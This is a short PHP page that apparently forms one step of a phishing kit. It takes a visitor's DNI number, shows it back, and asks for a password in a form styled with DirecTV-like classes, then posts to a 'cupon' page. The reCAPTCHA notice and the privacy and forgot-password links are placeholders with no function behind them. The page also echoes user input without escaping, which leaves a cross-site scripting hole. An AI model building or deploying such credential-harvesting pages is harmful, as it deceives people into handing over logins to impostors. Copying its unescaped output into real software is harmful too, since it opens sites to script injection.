<?php
if(isset($_POST["DNI"])){
	$dni = $_POST["DNI"];
}
else {
	header("Location: /");
}
include_once("parts/header.php");
?>
<body>
	<nav>
		<div class="contenedor">
<?php
include_once("parts/nav.php");
?>
		</div>
	</nav>
	<div class="container-fluid">
		<div class="row d-flex justify-content-center">
			<div class="col-10 col-md-6 mt-5">
				<h3 class="text-left mb-4">Hola, BIENVENIDO!</h3>
				<p class="dni">DNI: <?php echo $dni; ?></p>
				<div class="row d-flex justify-content-center contenedor_caja mb-5">
					<div class="col-12">
						<form method="POST" action="cupon">
							<input type="hidden" name="DNI" value="<?php echo $dni; ?>">
							<div class="row">
								<div class="col-12 m-0 p-0">
									<label for="Clave" id="Clave_label">Clave</label>
								</div>
								<div class="col-12 m-0 p-0">
									<input type="password" class="input-smart-card directv-input touched" id="Clave" name="password" placeholder="" minlength="4" required>
								</div>
								<div class="col-12 hr"></div>
								<div class="col-12 mt-2 buttons">
									<a href="#" class="step2">Olvidé mi clave</a>
									<button type="submit" id="Clave_button">Ingresar</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
			<div class="col-12">
				<p class="secure">Protegido por reCAPTCHA <a href="#">Privacidad</a> - <a href="#">Condiciones</a></p>
			</div>
		</div>
	</div>
<?php
include_once("parts/footer.php");
?>
</body>
</html>